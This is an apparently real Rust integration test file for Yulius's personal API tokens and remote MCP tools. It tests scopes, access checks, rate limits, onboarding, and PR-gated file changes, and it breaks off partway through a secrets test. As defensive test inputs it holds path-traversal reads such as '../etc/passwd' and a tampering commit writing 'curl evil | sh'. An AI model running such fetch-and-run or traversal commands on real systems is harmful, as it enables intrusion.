//! Driving Yulius from a person's own agent (SPEC-247): personal API tokens with scopes, the
//! remote MCP on the public listener, and a laptop-only onboarding over it.

use crate::support;

use axum::http::{Method, StatusCode};
use serde_json::{Value, json};
use support::FakeRemote as _;
use support::repos::World;
use support::{Creds, TestResult, call};
use yulius_app::model::UserRecord;
use yulius_app::ports::store::{SandboxStore as _, TaskStore as _};
use yulius_app::ports::store_ext::AutomationStore;

type Error = Box<dyn std::error::Error>;

fn text(value: &Value) -> &str {
    value.as_str().unwrap_or_default()
}

/// A token of `scope` made in `browser`'s Settings; returns the creation answer.
async fn make_token(w: &World, browser: &Creds, label: &str, scope: &str) -> Result<Value, Error> {
    let made = call(
        &w.h.router,
        Method::POST,
        "/api/me/tokens",
        Some(json!({"label": label, "scope": scope})),
        browser,
    )
    .await?;
    assert_eq!(made.status, StatusCode::CREATED, "{}", made.body);
    Ok(made.body)
}

/// Bearer credentials of a token.
fn bearer(token: &str) -> Creds {
    Creds {
        bearer: Some(token.to_owned()),
        ..Creds::default()
    }
}

/// A person with an `operate` token: `(user, browser, bearer)`.
async fn person(w: &World, login: &str) -> Result<(UserRecord, Creds, Creds), Error> {
    let (user, _) = w.user(login, false).await?;
    let browser = w.browser(&user).await?;
    let made = make_token(w, &browser, "laptop", "operate").await?;
    Ok((user, browser, bearer(text(&made["token"]))))
}

/// The audit entries about `target`, newest first, as `(action, actor, detail)`.
async fn audits(w: &World, target: &str) -> Result<Vec<(String, String, String)>, Error> {
    Ok(w.h
        .store
        .automation_audit(target, 50)
        .await?
        .into_iter()
        .map(|e| (e.action, e.actor, e.detail.unwrap_or_default()))
        .collect())
}

/// RMT-001..003: a token is made in the browser with a scope, shown once with the commands that
/// use it, listed with its last use, refused at once once revoked, and audited without itself.
#[tokio::test]
async fn tokens_are_made_in_the_browser_listed_and_revoked() -> TestResult {
    let w = World::new("org").await?;
    let (alice, cli) = w.user("alice", false).await?;
    let browser = w.browser(&alice).await?;
    let (_, bob_cli) = w.user("bob", false).await?;

    // A token cannot mint tokens.
    let refused = call(
        &w.h.router,
        Method::POST,
        "/api/me/tokens",
        Some(json!({"label": "x", "scope": "operate"})),
        &cli,
    )
    .await?;
    assert_eq!(refused.status, StatusCode::FORBIDDEN, "{}", refused.body);
    for (label, scope) in [("", "operate"), ("x", "cli"), ("x", "admin")] {
        let bad = call(
            &w.h.router,
            Method::POST,
            "/api/me/tokens",
            Some(json!({"label": label, "scope": scope})),
            &browser,
        )
        .await?;
        assert_eq!(
            bad.status,
            StatusCode::UNPROCESSABLE_ENTITY,
            "{label:?} {scope}"
        );
    }

    let made = make_token(&w, &browser, "laptop Claude Code", "operate").await?;
    let token = text(&made["token"]).to_owned();
    assert!(token.starts_with("yul_"), "{made}");
    assert_eq!(made["mcp_url"], "https://yulius.test/mcp");
    assert_eq!(
        made["claude_command"],
        format!(
            "claude mcp add --transport http yulius https://yulius.test/mcp --header \"Authorization: Bearer {token}\""
        )
    );
    assert_eq!(
        made["cli_command"],
        "yulius remote login https://yulius.test"
    );
    let id = text(&made["view"]["id"]).to_owned();

    let listed = call(&w.h.router, Method::GET, "/api/me/tokens", None, &browser).await?;
    assert_eq!(listed.status, StatusCode::OK);
    let mine = listed.body.as_array().ok_or("list")?;
    assert_eq!(
        mine.len(),
        2,
        "the operate token and the CLI one: {}",
        listed.body
    );
    let entry = mine
        .iter()
        .find(|t| t["id"] == id.as_str())
        .ok_or("listed")?;
    assert_eq!(entry["scope"], "operate");
    assert_eq!(entry["label"], "laptop Claude Code");
    assert!(entry["last_used_at"].is_null());
    assert!(entry.get("token").is_none() && !listed.body.to_string().contains(&token));
    assert!(
        mine.iter().any(|t| t["scope"] == "cli"),
        "a yulius login token is cli: {}",
        listed.body
    );

    // Its use is recorded.
    let me = call(&w.h.router, Method::GET, "/api/me", None, &bearer(&token)).await?;
    assert_eq!(me.status, StatusCode::OK);
    let listed = call(&w.h.router, Method::GET, "/api/me/tokens", None, &browser).await?;
    let entry = listed
        .body
        .as_array()
        .and_then(|l| l.iter().find(|t| t["id"] == id.as_str()).cloned())
        .ok_or("listed")?;
    assert!(entry["last_used_at"].is_string(), "{entry}");

    // Nobody else revokes it; its owner does, from any of their credentials.
    let other = call(
        &w.h.router,
        Method::DELETE,
        &format!("/api/me/tokens/{id}"),
        None,
        &bob_cli,
    )
    .await?;
    assert_eq!(other.status, StatusCode::NOT_FOUND);
    let revoked = call(
        &w.h.router,
        Method::DELETE,
        &format!("/api/me/tokens/{id}"),
        None,
        &cli,
    )
    .await?;
    assert_eq!(revoked.status, StatusCode::NO_CONTENT, "{}", revoked.body);
    let gone = call(&w.h.router, Method::GET, "/api/me", None, &bearer(&token)).await?;
    assert_eq!(gone.status, StatusCode::UNAUTHORIZED);
    let again = call(
        &w.h.router,
        Method::DELETE,
        &format!("/api/me/tokens/{id}"),
        None,
        &cli,
    )
    .await?;
    assert_eq!(again.status, StatusCode::NOT_FOUND);

    let entries = audits(&w, &id).await?;
    let actions: Vec<&str> = entries.iter().map(|(a, _, _)| a.as_str()).collect();
    assert_eq!(actions, ["api_token.revoke", "api_token.create"]);
    assert!(entries.iter().all(|(_, actor, detail)| actor == "alice"
        && detail == "laptop Claude Code (operate)"
        && !detail.contains("yul_")));
    Ok(())
}

/// RMT-002: a read-only token reads the REST API and changes nothing through it.
#[tokio::test]
async fn a_read_token_only_reads_the_rest_api() -> TestResult {
    let w = World::new("org").await?;
    let (alice, _) = w.user("alice", false).await?;
    let browser = w.browser(&alice).await?;
    let made = make_token(&w, &browser, "dashboards", "read").await?;
    let read = bearer(text(&made["token"]));
    let me = call(&w.h.router, Method::GET, "/api/me", None, &read).await?;
    assert_eq!(me.status, StatusCode::OK);
    let write = call(
        &w.h.router,
        Method::POST,
        "/api/sandboxes",
        Some(json!({"mode": "import", "repo": "Quartio-Studio/shop"})),
        &read,
    )
    .await?;
    assert_eq!(write.status, StatusCode::FORBIDDEN, "{}", write.body);
    assert!(text(&write.body["error"]["message"]).contains("read-only"));
    Ok(())
}

/// A JSON-RPC request to the public `/mcp`.
async fn rpc(
    w: &World,
    creds: &Creds,
    method: &str,
    params: Value,
) -> Result<support::Resp, Error> {
    call(
        &w.h.router,
        Method::POST,
        "/mcp",
        Some(json!({"jsonrpc": "2.0", "id": 1, "method": method, "params": params})),
        creds,
    )
    .await
}

/// A remote tool's result: `(is_error, text, record)`.
async fn remote(
    w: &World,
    creds: &Creds,
    name: &str,
    args: Value,
) -> Result<(bool, String, Value), Error> {
    let r = rpc(
        w,
        creds,
        "tools/call",
        json!({"name": name, "arguments": args, "_meta": {"yulius/structured": true}}),
    )
    .await?;
    assert_eq!(r.status, StatusCode::OK, "{name}: {}", r.body);
    let result = &r.body["result"];
    Ok((
        result["isError"] == true,
        text(&result["content"][0]["text"]).to_owned(),
        result["structuredContent"].clone(),
    ))
}

/// The tool names `tools/list` serves.
async fn served(w: &World, creds: &Creds) -> Result<Vec<String>, Error> {
    let r = rpc(w, creds, "tools/list", json!({})).await?;
    assert_eq!(r.status, StatusCode::OK, "{}", r.body);
    Ok(r.body["result"]["tools"]
        .as_array()
        .ok_or("tools")?
        .iter()
        .map(|t| text(&t["name"]).to_owned())
        .collect())
}

/// RMT-010, RMT-011: the public `/mcp` serves personal `read` and `operate` tokens only; a read
/// token is served and runs only what reads.
#[tokio::test]
async fn the_public_mcp_takes_only_personal_agent_tokens() -> TestResult {
    let w = World::new("org").await?;
    let (alice, cli) = w.user("alice", false).await?;
    let browser = w.browser(&alice).await?;
    let operate = bearer(text(
        &make_token(&w, &browser, "laptop", "operate").await?["token"],
    ));
    let read = bearer(text(
        &make_token(&w, &browser, "watch", "read").await?["token"],
    ));

    let none = rpc(&w, &Creds::default(), "initialize", json!({})).await?;
    assert_eq!(none.status, StatusCode::UNAUTHORIZED);
    let cookie = rpc(&w, &browser, "initialize", json!({})).await?;
    assert_eq!(
        cookie.status,
        StatusCode::UNAUTHORIZED,
        "a browser session is not read here"
    );
    for foreign in ["ck_0123456789abcdef", "a-task-token", "yul_unknown"] {
        let refused = rpc(&w, &bearer(foreign), "initialize", json!({})).await?;
        assert_eq!(refused.status, StatusCode::UNAUTHORIZED, "{foreign}");
    }
    let device = rpc(&w, &cli, "initialize", json!({})).await?;
    assert_eq!(device.status, StatusCode::FORBIDDEN, "{}", device.body);
    assert!(text(&device.body["error"]["message"]).contains("Connect your local agent"));

    let init = rpc(
        &w,
        &operate,
        "initialize",
        json!({"protocolVersion": "2025-06-18"}),
    )
    .await?;
    assert_eq!(init.status, StatusCode::OK, "{}", init.body);
    assert_eq!(init.body["result"]["serverInfo"]["name"], "yulius");
    assert!(text(&init.body["result"]["instructions"]).contains("project_import"));
    let notification = call(
        &w.h.router,
        Method::POST,
        "/mcp",
        Some(json!({"jsonrpc": "2.0", "method": "notifications/initialized"})),
        &operate,
    )
    .await?;
    assert_eq!(notification.status, StatusCode::ACCEPTED);
    let stream = call(&w.h.router, Method::GET, "/mcp", None, &operate).await?;
    assert_eq!(stream.status, StatusCode::METHOD_NOT_ALLOWED);

    let all = served(&w, &operate).await?;
    for name in [
        "projects_list",
        "project_import",
        "task_create",
        "task_restart",
        "ci_runs",
    ] {
        assert!(all.iter().any(|n| n == name), "{name} in {all:?}");
    }
    let reading = served(&w, &read).await?;
    assert!(reading.iter().any(|n| n == "tasks_list"));
    assert!(
        !reading
            .iter()
            .any(|n| n == "task_create" || n == "project_import")
    );
    let (error, said, _) = remote(
        &w,
        &read,
        "project_import",
        json!({"repo": "Quartio-Studio/x"}),
    )
    .await?;
    assert!(error && said.contains("read-only"), "{said}");
    let (error, said, _) = remote(&w, &operate, "no_such_tool", json!({})).await?;
    assert!(error && said.contains("unknown tool"), "{said}");
    Ok(())
}

/// RMT-012, RMT-013, RMT-015: a project tool runs only with the person's access to that project
/// for its action; a project they cannot see is not found; changes are audited as the remote
/// caller without their arguments.
#[tokio::test]
async fn project_tools_follow_the_persons_access_and_are_audited() -> TestResult {
    let w = World::new("org").await?;
    let shop = support::seed_sandbox(&w.h, "s1", "shop", "u-alice").await?;
    let (_, _, alice) = person(&w, "alice").await?;
    let (_, _, bob) = person(&w, "bob").await?;
    let (_, _, carol) = person(&w, "carol").await?;
    w.grant("alice", "acme/shop", "admin");
    w.grant("bob", "acme/shop", "pull");

    let (error, said, listed) = remote(&w, &alice, "projects_list", json!({})).await?;
    assert!(!error, "{said}");
    assert_eq!(listed["projects"][0]["project"], "acme/shop", "{listed}");
    assert_eq!(listed["projects"][0]["access"], "admin");
    let (_, _, none) = remote(&w, &carol, "projects_list", json!({})).await?;
    assert_eq!(none["projects"], json!([]));

    // Every way of naming the project works; a missing one is asked for.
    for name in ["acme/shop", "shop", "s1"] {
        let (error, said, _) = remote(&w, &bob, "tasks_list", json!({"project": name})).await?;
        assert!(!error, "{name}: {said}");
    }
    let (error, said, _) = remote(&w, &bob, "tasks_list", json!({})).await?;
    assert!(error && said.contains("`project`"), "{said}");

    // Read access reads and changes nothing; no access is the same as no project.
    let automation = json!({"project": "acme/shop", "name": "Nightly docs", "cron": "0 3 * * *", "prompt": "Bring the docs up to date"});
    let (error, said, _) = remote(&w, &bob, "automation_create", automation.clone()).await?;
    assert!(error && said.contains("write access"), "{said}");
    let (error, said, _) = remote(
        &w,
        &bob,
        "task_create",
        json!({"project": "acme/shop", "prompt": "Add a page"}),
    )
    .await?;
    assert!(error && said.contains("write access"), "{said}");
    let (error, hidden, _) =
        remote(&w, &carol, "tasks_list", json!({"project": "acme/shop"})).await?;
    let (_, missing, _) =
        remote(&w, &carol, "tasks_list", json!({"project": "acme/ghost"})).await?;
    assert!(error && hidden == missing, "{hidden} / {missing}");

    // The Superagent's tools run as the remote caller.
    let (error, said, created) = remote(&w, &alice, "automation_create", automation).await?;
    assert!(!error, "{said}");
    let (_, _, listed) = remote(
        &w,
        &alice,
        "automations_list",
        json!({"project": "acme/shop"}),
    )
    .await?;
    assert!(listed.to_string().contains("Nightly docs"), "{listed}");
    let automation_id = text(&created["automation"]["id"]).to_owned();
    assert!(!automation_id.is_empty(), "{created}");
    let entries = audits(&w, &automation_id).await?;
    assert!(
        entries.iter().any(|(_, actor, _)| actor == "remote:alice"),
        "{entries:?}"
    );

    let entries = audits(&w, shop.id.as_str()).await?;
    let remote_calls: Vec<&(String, String, String)> = entries
        .iter()
        .filter(|(a, _, _)| a == "remote.tool")
        .collect();
    assert_eq!(
        remote_calls.len(),
        3,
        "the refused automation and task, and the created automation: {entries:?}"
    );
    for (_, actor, detail) in &remote_calls {
        let detail: Value = serde_json::from_str(detail)?;
        assert!(detail["tool"] == "automation_create" || detail["tool"] == "task_create");
        assert!(detail["token"].is_string());
        assert!(!detail.to_string().contains("Bring the docs"), "{detail}");
        assert!(actor == "remote:alice" || actor == "remote:bob");
    }
    assert!(
        remote_calls
            .iter()
            .any(|(_, actor, detail)| actor == "remote:bob" && detail.contains("\"ok\":false"))
    );
    Ok(())
}

/// RMT-014: one token makes at most 120 requests a minute; another token is not slowed.
#[tokio::test]
async fn a_token_is_limited_to_120_requests_a_minute() -> TestResult {
    let w = World::new("org").await?;
    let (alice, _) = w.user("alice", false).await?;
    let browser = w.browser(&alice).await?;
    let busy = bearer(text(
        &make_token(&w, &browser, "busy", "operate").await?["token"],
    ));
    let calm = bearer(text(
        &make_token(&w, &browser, "calm", "read").await?["token"],
    ));
    for n in 0..120 {
        let r = rpc(&w, &busy, "ping", json!({})).await?;
        assert_eq!(r.status, StatusCode::OK, "request {n}");
    }
    let limited = rpc(&w, &busy, "ping", json!({})).await?;
    assert_eq!(limited.status, StatusCode::TOO_MANY_REQUESTS);
    assert!(text(&limited.body["error"]["message"]).contains("120 requests a minute"));
    let other = rpc(&w, &calm, "ping", json!({})).await?;
    assert_eq!(other.status, StatusCode::OK);
    w.h.clock
        .0
        .fetch_add(61_000, std::sync::atomic::Ordering::SeqCst);
    let later = rpc(&w, &busy, "ping", json!({})).await?;
    assert_eq!(later.status, StatusCode::OK);
    Ok(())
}

/// RMT-020, RMT-021: a repository is listed, imported, described and its onboarding started with
/// an operate token alone; a `yulius login` token still cannot start it (SPEC-051 OBD-002).
#[tokio::test]
async fn a_repository_is_imported_and_onboarded_remotely() -> TestResult {
    let w = World::new("org").await?;
    let (alice, cli) = w.user("alice", false).await?;
    let browser = w.browser(&alice).await?;
    let operate = bearer(text(
        &make_token(&w, &browser, "laptop", "operate").await?["token"],
    ));
    w.remote(
        support::repos::OWNER,
        "shop",
        &[("README.md", "# Shop\n")],
        &[],
    )?;
    w.github
        .add_installation_repo(support::repos::OWNER, "shop", true);
    w.grant("alice", "shop", "admin");

    let (error, said, repos) = remote(&w, &operate, "repositories_list", json!({})).await?;
    assert!(!error, "{said}");
    assert_eq!(repos["repositories"][0]["name"], "shop", "{repos}");

    let (error, said, imported) = remote(
        &w,
        &operate,
        "project_import",
        json!({"repo": "Quartio-Studio/shop"}),
    )
    .await?;
    assert!(!error, "{said}");
    assert_eq!(imported["project"], "Quartio-Studio/shop");
    assert_eq!(
        imported["onboarding"], "pending",
        "an import waits for onboarding_start"
    );
    let (error, said, _) = remote(
        &w,
        &operate,
        "project_import",
        json!({"repo": "Quartio-Studio/shop"}),
    )
    .await?;
    assert!(error && said.contains("already"), "{said}");

    let (error, said, project) = remote(
        &w,
        &operate,
        "project_get",
        json!({"project": "Quartio-Studio/shop"}),
    )
    .await?;
    assert!(!error, "{said}");
    assert_eq!(project["onboarding"]["state"], "pending");
    assert!(
        project["onboarding_plan"]["steps"]
            .as_array()
            .is_some_and(|s| !s.is_empty()),
        "{project}"
    );
    assert!(text(&project["next"]).contains("onboarding_start"));

    // The CLI's device token is refused, as before; the operate token starts it.
    let sid = text(&imported["id"]).to_owned();
    let refused = call(
        &w.h.router,
        Method::POST,
        &format!("/api/sandboxes/{sid}/onboarding/approve"),
        None,
        &cli,
    )
    .await?;
    assert_eq!(refused.status, StatusCode::FORBIDDEN);
    let (error, said, started) = remote(
        &w,
        &operate,
        "onboarding_start",
        json!({"project": "Quartio-Studio/shop"}),
    )
    .await?;
    assert!(!error, "{said}");
    assert_eq!(started["onboarding"], "preparing", "{started}");
    let (_, _, project) = remote(&w, &operate, "project_get", json!({"project": "shop"})).await?;
    assert!(
        project["onboarding_plan"]["task_number"].is_number(),
        "{project}"
    );
    Ok(())
}

/// RMT-022, RMT-023: tasks are restarted, paused and followed, and CI and CD are read and run,
/// through the functions of the web UI for the person.
#[tokio::test]
async fn tasks_ci_and_cd_are_driven_remotely() -> TestResult {
    use yulius_domain::task::{StopReason, TaskStatus};
    let w = World::new("org").await?;
    support::seed_sandbox(&w.h, "s1", "shop", "u-alice").await?;
    let (_, _, alice) = person(&w, "alice").await?;
    w.grant("alice", "acme/shop", "admin");
    let running =
        support::seed_task(&w.h, "t-run", "s1", "u-alice", TaskStatus::Running, None).await?;
    let stopped = support::seed_task(
        &w.h,
        "t-stop",
        "s1",
        "u-alice",
        TaskStatus::Stopped(StopReason::Cancelled),
        None,
    )
    .await?;
    let project = |extra: Value| {
        let mut args = json!({"project": "acme/shop"});
        if let (Some(args), Some(extra)) = (args.as_object_mut(), extra.as_object()) {
            args.extend(extra.clone());
        }
        args
    };

    let (error, said, _) = remote(
        &w,
        &alice,
        "task_restart",
        project(json!({"task_id": running.id.as_str()})),
    )
    .await?;
    assert!(error && said.contains("stop it first"), "{said}");
    let (error, said, _) =
        remote(&w, &alice, "task_restart", project(json!({"number": 999}))).await?;
    assert!(error && said.to_lowercase().contains("not found"), "{said}");
    // A resting task goes through Continue: here it reaches the start, which needs a clone.
    let (error, said, _) = remote(
        &w,
        &alice,
        "task_restart",
        project(json!({"task_id": stopped.id.as_str()})),
    )
    .await?;
    assert!(error && said.contains("not cloned"), "{said}");
    let (error, said, delivery) = remote(
        &w,
        &alice,
        "task_delivery",
        project(json!({"task_id": stopped.id.as_str()})),
    )
    .await?;
    assert!(!error, "{said}");
    assert_eq!(delivery["next_actions"], json!(["open_pr"]), "{delivery}");
    let (error, said, _) = remote(
        &w,
        &alice,
        "task_pause",
        project(json!({"task_id": stopped.id.as_str()})),
    )
    .await?;
    assert!(
        error && said.contains("Only a running task can be paused"),
        "{said}"
    );

    let (error, said, ci) = remote(&w, &alice, "ci_runs", project(json!({}))).await?;
    assert!(!error, "{said}");
    assert_eq!(ci["runs"], json!([]), "{ci}");
    let (error, said, _) = remote(&w, &alice, "ci_run", project(json!({"run_id": "nope"}))).await?;
    assert!(error && said.contains("not found"), "{said}");
    let (error, said, cd) = remote(&w, &alice, "cd_status", project(json!({}))).await?;
    assert!(!error, "{said}");
    assert!(cd["environments"].is_array(), "{cd}");
    let (error, said, _) = remote(
        &w,
        &alice,
        "cd_deploy",
        project(json!({"environment": "prod"})),
    )
    .await?;
    assert!(error && said.contains("only a person"), "{said}");
    let (error, said, _) = remote(
        &w,
        &alice,
        "cd_deploy",
        project(json!({"environment": "dev"})),
    )
    .await?;
    assert!(
        error && said.contains("not cloned"),
        "dev goes to the deploy: {said}"
    );
    Ok(())
}

/// GitHub's side of a repository for the fake GitHub: its bare remote, where merges land as
/// GitHub lands them.
struct Origin(std::path::PathBuf);

impl support::FakeRemote for Origin {
    fn branch_sha(&self, branch: &str) -> Option<String> {
        support::repos::git(
            &self.0,
            &[
                "rev-parse",
                "--verify",
                "--quiet",
                &format!("refs/heads/{branch}"),
            ],
        )
        .ok()
        .map(|sha| sha.trim().to_owned())
    }
    fn merge(&self, base: &str, head: &str, method: &str, message: &str) -> Result<String, String> {
        let base_sha = self.branch_sha(base).ok_or("base branch not found")?;
        let tree = support::repos::git(&self.0, &["merge-tree", "--write-tree", &base_sha, head])?;
        let tree = tree.trim().to_owned();
        let mut args = vec!["commit-tree", tree.as_str(), "-p", base_sha.as_str()];
        if method == "merge" {
            args.extend(["-p", head]);
        }
        args.extend(["-m", message]);
        let commit = support::repos::git(&self.0, &args)?.trim().to_owned();
        support::repos::git(
            &self.0,
            &[
                "update-ref",
                &format!("refs/heads/{base}"),
                &commit,
                &base_sha,
            ],
        )?;
        Ok(commit)
    }
    fn fast_forward(&self, _: &str, _: &str) -> Result<(), String> {
        Err("not used".into())
    }
    fn delete_branch(&self, branch: &str) -> Result<bool, String> {
        if self.branch_sha(branch).is_none() {
            return Ok(false);
        }
        support::repos::git(
            &self.0,
            &["update-ref", "-d", &format!("refs/heads/{branch}")],
        )
        .map(|_| true)
    }
}

/// `files` at `rev` of the bare `origin`, or `None`.
fn origin_file(origin: &std::path::Path, rev: &str, path: &str) -> Option<String> {
    support::repos::git(origin, &["show", &format!("{rev}:{path}")]).ok()
}

/// A project `Quartio-Studio/shop` imported remotely by alice (admin) with an operate token;
/// returns the token's credentials and the bare origin.
async fn imported_shop(
    w: &World,
    files: &[(&str, &str)],
) -> Result<(Creds, std::path::PathBuf), Error> {
    let (_, _, alice) = person(w, "alice").await?;
    let origin = w.remote(support::repos::OWNER, "shop", files, &["dev"])?;
    w.h.github
        .set_remote(std::sync::Arc::new(Origin(origin.clone())));
    w.github
        .add_installation_repo(support::repos::OWNER, "shop", true);
    w.grant("alice", "shop", "admin");
    let (error, said, _) = remote(
        w,
        &alice,
        "project_import",
        json!({"repo": "Quartio-Studio/shop"}),
    )
    .await?;
    assert!(!error, "{said}");
    Ok((alice, origin))
}

/// RMT-024..026 (ADR-0189): files are read at the integration branch; a change is one commit of
/// the person on a new change branch with a pull request, made away from the sandbox's clone; it
/// merges only once Yulius CI passed at its head, and only change pull requests merge so.
#[tokio::test]
async fn files_change_through_a_pull_request_merged_on_green() -> TestResult {
    use yulius_app::ports::store_ext::CiStore as _;
    use yulius_domain::ci::RunState;
    let w = World::new("org").await?;
    let (alice, origin) = imported_shop(
        &w,
        &[
            ("README.md", "# Shop\n"),
            ("yulius.toml", "[project]\nname = \"shop\"\n"),
            ("docs/old.md", "old\n"),
        ],
    )
    .await?;
    let shop = json!({"project": "Quartio-Studio/shop"});
    let with = |extra: Value| {
        let mut args = shop.clone();
        if let (Some(args), Some(extra)) = (args.as_object_mut(), extra.as_object()) {
            args.extend(extra.clone());
        }
        args
    };

    let (error, said, root) = remote(&w, &alice, "project_files", with(json!({}))).await?;
    assert!(!error, "{said}");
    let entries = root["entries"].to_string();
    assert!(
        entries.contains("README.md")
            && entries.contains("yulius.toml")
            && entries.contains("docs"),
        "{root}"
    );
    let (_, _, docs) = remote(&w, &alice, "project_files", with(json!({"path": "docs"}))).await?;
    assert_eq!(docs["entries"], json!(["docs/old.md"]), "{docs}");
    let (error, said, file) = remote(
        &w,
        &alice,
        "project_file_read",
        with(json!({"path": "yulius.toml"})),
    )
    .await?;
    assert!(!error, "{said}");
    assert_eq!(file["content"], "[project]\nname = \"shop\"\n");
    for (path, why) in [
        (".git/config", ".git"),
        ("../etc/passwd", ".."),
        ("missing.txt", "does not exist"),
    ] {
        let (error, said, _) =
            remote(&w, &alice, "project_file_read", with(json!({"path": path}))).await?;
        assert!(error && said.contains(why), "{path}: {said}");
    }

    // Nothing changes: refused, and nothing is pushed.
    let (error, said, _) = remote(
        &w,
        &alice,
        "project_change",
        with(json!({"title": "noop", "files": [{"path": "README.md", "content": "# Shop\n"}]})),
    )
    .await?;
    assert!(error && said.contains("nothing to change"), "{said}");

    let toml = "[project]\nname = \"shop\"\n\n[[ci.jobs]]\nname = \"test\"\ncommand = \"true\"\n";
    let (error, said, changed) = remote(
        &w,
        &alice,
        "project_change",
        with(json!({
            "title": "ci: run the tests in Yulius CI",
            "body": "Sets up Yulius CI.",
            "files": [{"path": "yulius.toml", "content": toml}, {"path": "docs/old.md", "delete": true}],
        })),
    )
    .await?;
    assert!(!error, "{said}");
    let branch = text(&changed["branch"]).to_owned();
    assert!(
        branch.starts_with("yulius/change-") && branch.ends_with("-ci-run-the-tests-in-yulius-ci"),
        "{branch}"
    );
    let number = changed["pull_request"]["number"].as_u64().ok_or("number")?;
    assert_eq!(
        origin_file(&origin, &branch, "yulius.toml").as_deref(),
        Some(toml)
    );
    assert_eq!(origin_file(&origin, &branch, "docs/old.md"), None);
    assert_eq!(
        origin_file(&origin, "dev", "docs/old.md").as_deref(),
        Some("old\n"),
        "dev is untouched"
    );
    let author = support::repos::git(&origin, &["log", "-1", "--format=%an <%ae>|%s", &branch])?;
    assert!(
        author.starts_with("ALICE <")
            && author.contains("alice@users.noreply.github.com>|ci: run the tests"),
        "{author}"
    );
    let pull = w.h.github.pull(number).ok_or("pull")?;
    assert_eq!(
        (pull.base.as_str(), pull.head.as_str()),
        ("dev", branch.as_str())
    );
    assert_eq!(
        w.h.github.pull_author(number).as_deref(),
        Some("alice"),
        "opened as the person"
    );
    let sid =
        w.h.store
            .sandbox_by_repo("Quartio-Studio", "shop")
            .await?
            .ok_or("sandbox")?;
    // The commit was made in a private directory outside the sandbox, which its agents can
    // write (review finding 1), and nothing of it is left.
    assert!(
        !w.data_dir()
            .join("sandboxes")
            .join(sid.id.as_str())
            .join("changes")
            .exists(),
        "nothing of a change is under the sandbox"
    );
    let changes = w.data_dir().join("changes");
    let mode = std::os::unix::fs::PermissionsExt::mode(&std::fs::metadata(&changes)?.permissions());
    assert_eq!(mode & 0o077, 0, "only the server reads the scratch clones");
    assert_eq!(
        std::fs::read_dir(&changes)?.count(),
        0,
        "the scratch clone is gone"
    );

    // Before Yulius CI saw it, the pull request that brings the CI does not merge unchecked.
    let (error, said, _) =
        remote(&w, &alice, "change_merge", with(json!({"number": number}))).await?;
    assert!(error && said.contains("pending"), "{said}");

    // Yulius CI tests the pull request with the jobs it adds; it merges once that run passed.
    w.h.app.ci_sync_sandbox(&sid).await?;
    let (_, _, ci) = remote(&w, &alice, "ci_runs", shop.clone()).await?;
    let run = ci["runs"]
        .as_array()
        .and_then(|runs| runs.iter().find(|r| r["sha"] == pull.head_sha.as_str()))
        .cloned()
        .ok_or_else(|| format!("no run of the pull request: {ci}"))?;
    let (error, said, _) =
        remote(&w, &alice, "change_merge", with(json!({"number": number}))).await?;
    assert!(error && said.contains("pending"), "{said}");
    w.h.store
        .transition_ci_run(
            text(&run["id"]),
            &[RunState::Queued],
            RunState::Passed,
            &yulius_app::ci::CiRunUpdate::default(),
        )
        .await?;
    let (error, said, merged) =
        remote(&w, &alice, "change_merge", with(json!({"number": number}))).await?;
    assert!(!error, "{said}");
    assert_eq!(merged["merged"]["into"], "dev");
    assert_eq!(
        origin_file(&origin, "dev", "yulius.toml").as_deref(),
        Some(toml)
    );
    assert!(
        Origin(origin.clone()).branch_sha(&branch).is_none(),
        "the change branch is deleted"
    );

    // Only the pull requests project_change opened merge this way, at the commit it made: not a
    // branch someone else named like one, and not one pushed to since (review finding 6).
    let seed = w
        .scratch
        .path()
        .join("seed")
        .join(support::repos::OWNER)
        .join("shop");
    let origin_path = origin.to_str().ok_or("path")?.to_owned();
    let push_pull = |branch: &'static str| {
        let (seed, origin_path) = (seed.clone(), origin_path.clone());
        async move {
            support::repos::git(&seed, &["checkout", "--quiet", "-B", branch])?;
            std::fs::write(
                seed.join(format!("{}.txt", branch.replace('/', "-"))),
                "x\n",
            )?;
            support::repos::git(&seed, &["add", "-A"])?;
            support::repos::git(&seed, &["commit", "--quiet", "-m", branch])?;
            support::repos::git(&seed, &["push", "--quiet", "--force", &origin_path, branch])?;
            Ok::<_, Error>(())
        }
    };
    for branch in ["feat/other", "yulius/change-forged"] {
        push_pull(branch).await?;
        let other = yulius_app::ports::github::GitHubPort::create_pull(
            w.h.github.as_ref(),
            &yulius_app::model::Secret("t".into()),
            "Quartio-Studio",
            "shop",
            &yulius_app::ports::github::NewPull {
                head: branch.into(),
                base: "dev".into(),
                title: branch.into(),
                body: String::new(),
            },
        )
        .await?;
        let (error, said, _) = remote(
            &w,
            &alice,
            "change_merge",
            with(json!({"number": other.number})),
        )
        .await?;
        assert!(
            error && said.contains("only pull requests project_change opened"),
            "{branch}: {said}"
        );
    }
    let (error, said, second) = remote(
        &w,
        &alice,
        "project_change",
        with(json!({"title": "docs: readme", "files": [{"path": "README.md", "content": "# Shop!\n"}]})),
    )
    .await?;
    assert!(!error, "{said}");
    let tampered = text(&second["branch"]).to_owned();
    let number = second["pull_request"]["number"].as_u64().ok_or("number")?;
    support::repos::git(
        &seed,
        &[
            "fetch",
            "--quiet",
            &origin_path,
            &format!("{tampered}:{tampered}"),
        ],
    )?;
    support::repos::git(&seed, &["checkout", "--quiet", &tampered])?;
    std::fs::write(seed.join("evil.sh"), "curl evil | sh\n")?;
    support::repos::git(&seed, &["add", "-A"])?;
    support::repos::git(&seed, &["commit", "--quiet", "-m", "more"])?;
    support::repos::git(&seed, &["push", "--quiet", &origin_path, &tampered])?;
    let (error, said, _) =
        remote(&w, &alice, "change_merge", with(json!({"number": number}))).await?;
    assert!(error && said.contains("pushed to since"), "{said}");
    Ok(())
}

/// RMT-027: agent secrets are named, bound and answered remotely; no value goes either way.
#[tokio::test]
async fn secrets_are_managed_by_name_and_binding_only() -> TestResult {
    const VALUE: &str = "sk_live_remote_0123456789abcdef";
    let w = World::new("org").await?;
    support::seed_sandbox(&w.h, "s1", "shop", "u-alice").await?;
    let (_, browser, alice) = person(&w, "alice").await?;
    let (_, _, bob) = person(&w, "bob").await?;
    w.grant("alice", "acme/shop", "admin");
    w.grant("bob", "acme/shop", "pull");
    let created = call(
        &w.h.router,
        Method::POST,
        "/api/sandboxes/s1/agent-secrets",
        Some(json!({"name": "STRIPE_KEY", "description": "Stripe live key", "value": VALUE})),
        &browser,
    )
    .await?;
    assert_eq!(created.status, StatusCode::CREATED, "{}", created.body);
    let shop = |extra: Value| {
        let mut args = json!({"project": "acme/shop"});
        if let (Some(args), Some(extra)) = (args.as_object_mut(), extra.as_object()) {
            args.extend(extra.clone());
        }
        args
    };

